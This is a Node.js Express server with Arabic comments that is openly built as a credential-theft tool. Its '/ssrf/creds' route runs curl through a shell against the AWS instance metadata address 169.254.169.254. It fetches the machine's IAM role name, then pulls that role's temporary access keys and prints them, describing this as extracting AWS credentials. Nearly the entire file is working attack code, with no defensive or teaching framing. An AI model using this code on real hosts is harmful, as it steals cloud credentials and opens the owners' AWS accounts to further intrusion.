const express = require("express");
const { exec } = require("child_process");
const app = express();
const PORT = 10000;

// خطوة 1: استخراج اسم الدور (IAM Role)
function getIAMRole(callback) {
  const cmd = `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`;
  exec(cmd, (err, stdout) => {
    if (err || !stdout.trim()) return callback(null);
    callback(stdout.trim());
  });
}

// خطوة 2: استخراج الـ credentials باستخدام اسم الدور
function getIAMCredentials(role) {
  const credsURL = `http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`;
  const cmd = `curl -s "${credsURL}"`;
  exec(cmd, (err, stdout) => {
    if (err || !stdout) {
      console.error("❌ Failed to extract credentials");
    } else {
      console.log("✅ IAM Credentials:\n", stdout);
    }
  });
}

// مسار SSRF trigger
app.get("/ssrf/creds", (req, res) => {
  getIAMRole((role) => {
    if (!role) {
      res.send("❌ Could not fetch IAM Role");
      return;
    }

    console.log("🔐 IAM Role:", role);
    getIAMCredentials(role);
    res.send(`<h1>🧨 Trying to extract AWS credentials for role: ${role}</h1>`);
  });
});

app.listen(PORT, () => {
  console.log(`🔥 Server running at http://localhost:${PORT}`);
});
